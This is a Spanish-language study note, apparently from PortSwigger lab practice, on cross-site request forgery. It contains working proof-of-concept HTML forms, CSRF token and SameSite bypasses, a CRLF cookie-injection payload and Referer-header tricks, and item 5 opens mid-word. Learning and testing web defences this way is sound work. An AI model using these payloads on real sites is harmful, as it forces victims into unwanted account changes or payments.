@@ -1,0 +1,180 @@
+El objetivo es hacer que un usuario acabe por hacer una acción dentro de la web sin su consentimiento
+
+## En que caso será vulnerable ? 
+
+Buscamos 3 cosas : 
+
+1. Un endpoint que haga una acción relevante
+2. Que la web solo vea si estas autorizado a hacer la acción a través de unas cookies
+3. ningún parámetro random
+
+Ejemplo:
+
+Imaginesmos que esta es la request que se hace para cambiar el correo de un usuario:
+
+```
+POST /email/change HTTP/1.1 
+Host: vulnerable-website.com 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 30 
+Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE 
+
+email=wiener@normal-user.com
+```
+
+esto cumpliría de lleno con las cosas que buscamos para hacer un csrf.
+Con esto el atacante podría crear una web maliciosa como esta : 
+
+```
+<html> 
+	<body> 
+	    <form action="https://vulnerable-website.com/email/change" method="POST"> 
+			<input type="hidden" name="email" value="pwned@evil-user.net" /> 
+		</form> 
+		<script> 
+			document.forms[0].submit();
+		</script> 
+	</body> 
+</html>
+```
+
+
+Cuando el usuario entre a esta web maliciosa, el form se autocompletará y enviará a la web vulnerable cambiando el email a `pwned@evil-user.net` y si el usuario está logeado en la web vulnerable entonces el buscador incluirá las cookies automaticamente haciendo que la acción se ejecute sin problema. Si no te da la gana escribir el html tú , puedes enviar la request a la herramienta CSRF PoC de burp click derecho -> engagement tools-> csrf PoC
+
+
+## Common flaws in CSRF token validation
+
+1. La validación del token puede no ser comprobada si la request se hace por GET en vez de por POST:
+```
+GET /email/change?email=pwned@evil-user.net HTTP/1.1 
+Host: vulnerable-website.com 
+Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+```
+2. Si eliminas el csrf token entero hay veces que te deja 
+3. No se comprueba si el token es de la persona que hace la request, simplemente la web tiene un monton de tokens y si el token que pasas es uno de esos pues lo acepta asi que puedes pillar el token que te asigna la web y usarlo con otros usuarios
+4. Hay veces que el token si está ligado a una cookie pero puede que no sea la cookie que se encarga de tu sesión
+```
+POST /email/change HTTP/1.1 
+Host: vulnerable-website.com 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 68 
+Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv 
+
+
+csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
+```
+en este caso la csrfKey es la cookie que tiene ligado el token csrf normal, entonces si hacemos un csrf podríamos usar nuestra csrfKey y así reutilizar el token csrf bypasseando la proteccion
+
+exploit :  /?search=test%0d%0aSet-Cookie:csrfKey%3dXuijnG5sGVFUlz3fzcPFOc76HcvzTsSX%3b%20SameSite=None 
+
+ALERT!= esto hacerlo con img no con iframe que a veces los buscadores lo bloquean y poner same site none 
+5.  licados, y por ende si se puede inyectar una cookie a un usuario entonces podremos usar esa cookie como token csrf : 
+```
+POST /email/change HTTP/1.1 
+Host: vulnerable-website.com 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 68 
+Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa 
+
+
+csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
+```
+
+## Bypassing same site cookie restriction
+
+algunos buscadores usan same site cookie restriction que son basicamente que el buscador no deja incluir cookies de webs de terceros , estas politicas pueden ser de tres tipos:
+
+1. Strict -> solo incluye cookies si se lo pide la misma url
+2. Lax -> solo si es con GET y solo si es por accion del usuario como haciendo click en un link
+3. None-> hace de todo xd
+Ejemplo:
+
+```
+Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
+```
+
+
+### Lax
+aplicado por default en chrome
+
+1. Si la consulta se puede cambiar a GET podremos hacer : 
+```
+<script> document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000'; </script>
+```
+2. Si no deja ni GET y usa algún framework como Symfony , suelen soportar un metodo que reescribe el de la request, en Symfony es `_method` :
+```
+<form action="https://vulnerable-website.com/account/transfer-payment" method="POST"> <input type="hidden" name="_method" value="GET"> <input type="hidden" name="recipient" value="hacker"> <input type="hidden" name="amount" value="1000000"> </form>
+```
+3. Chorme pone las cookies en Lax por default a los 120 segundos, antes de ese tiempo podremos hacer ataques normales como si fuerana None , para ello habrá que redirigir al usuario a la pagina de login de la web, como los buscadores no dejan que salten pantallas emergentes sin interacción del usuario el script tendría que ser así : 
+
+```
+window.onclick = () => { 
+window.open('https://vulnerable-website.com/login/sso'); 
+}
+```
+
+Ejemplo de LAB:
+
+```
+<html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  <body>
+    <form action="https://0aea0063043c696d814752b200f30042.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="pruebas&#64;gmail&#46;com" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+window.onclick = () => { 
+window.open('https://0aea0063043c696d814752b200f30042.web-security-academy.net/social-login'); 
+}
+setTimeout(changeEmail, 5000);
+
+    function changeEmail(){
+        document.forms[0].submit();
+    }
+    </script>
+  </body>
+</html>
+
+```
+
+primero le cambia las cookies haciendo que visite : /social-login , este endpoint te redirige a otro sitio y cambia las cookies, asi que ponemos un tiempo prudente de espera antes de submitear el nuevo email.
+### Strict
+
+Si consigues meter un client-side redirect te dejará hacer CSRF puesto que el buscador no lo interpreta como un redirect normal, esto también se podria usar si podemos hacer que la cookie de alguien cambie dandonos estos 120 segundos para atacar
+
+## Bypass de refer header 
+
+Lo ponen los buscadores para saber de donde viene la petición pero si pones esto en el html lo bypasseas eliminando el header : 
+
+`<meta name="referrer" content="never">`
+o
+`<meta name="referrer" content="no-referrer">`
+
+Otra forma es si la web verifica que en el refer header esté su web sin ver si hay algo mas  esto podría bypassearse:
+
+Web vulnerable :
+```
+http://vulnerable-website.com.attacker-website.com/csrf-attack
+```
+
+Web del atacante
+
+```
+http://attacker-website.com/csrf-attack?vulnerable-website.com
+```
+
+esto sera efectivo si en las respuestas de la web vemos : `Referrer-Policy: unsafe-url`
+
+Así quedaría el exploit server :
+
+
+![[Pasted image 20250922201425.png]]
+
+la funcion history.pushState es para que en refer salga 
+```
+Refer:exploit-server/?vulnerable-web
+```
+
+y luego recordar que en el apartado de HEAD hay que poner `Referrer-Policy: unsafe-url` 
+para que el ataque sea efectivo
